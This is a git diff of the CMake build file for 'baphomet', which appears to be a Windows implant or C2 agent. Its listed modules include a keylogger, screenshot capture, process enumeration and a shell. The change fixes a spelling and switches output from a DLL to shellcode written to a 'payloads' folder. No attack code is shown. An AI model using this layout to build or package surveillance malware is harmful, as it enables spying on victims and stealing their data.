@@ -4,6 +4,9 @@ project(baphomet)
 set(CMAKE_CXX_STANDARD 17)
 set(MAIN_INCLUDE_DIR ${CMAKE_CURRENT_SOURCE_DIR}/include)
 
+#temp
+set(CMAKE_RUNTIME_OUTPUT_DIRECTORY "C:\\lurchV3\\app\\payloads")
+set(CMAKE_RUNTIME_OUTPUT_DIRECTORY_RELEASE "C:\\lurchV3\\app\\payloads")
 
 if(MSVC)
     add_compile_options(
@@ -19,11 +22,11 @@ add_library(baphomet SHARED src/main.cpp
         src/networking/http/init.cpp
         src/networking/http/recieve.cpp
 
-        src/reconaissance/screenshot.cpp
-        src/reconaissance/basic.cpp
-        src/reconaissance/procenum.cpp
-        src/reconaissance/whoami.cpp
-        src/reconaissance/keylogger.cpp
+        src/reconnaissance/screenshot.cpp
+        src/reconnaissance/basic.cpp
+        src/reconnaissance/procenum.cpp
+        src/reconnaissance/whoami.cpp
+        src/reconnaissance/keylogger.cpp
 
         src/util/controlflow_guard.cpp
         src/util/init_config.cpp
@@ -54,7 +57,7 @@ add_library(baphomet SHARED src/main.cpp
         include/io.hpp
         include/macro.hpp
         include/misc.hpp
-        include/reconaissance.hpp
+        include/reconnaissance.hpp
         include/shell.hpp
         include/sleep.hpp
         include/structs.hpp
@@ -66,6 +69,10 @@ if(MSVC)
     target_link_options(baphomet PRIVATE "/SECTION:.baph,RW")
 endif()
 
+
+#target_compile_definitions(baphomet PRIVATE BAPHOMET_COMPILE_FOR_EXE)
+target_compile_definitions(baphomet PRIVATE BAPHOMET_COMPILE_FOR_SHELLCODE)
+
+
 target_compile_definitions(baphomet PRIVATE BAPHOMET_DEBUG)
-target_compile_definitions(baphomet PRIVATE BAPHOMET_COMPILE_AS_DLL)
 target_include_directories(baphomet PRIVATE ${MAIN_INCLUDE_DIR})
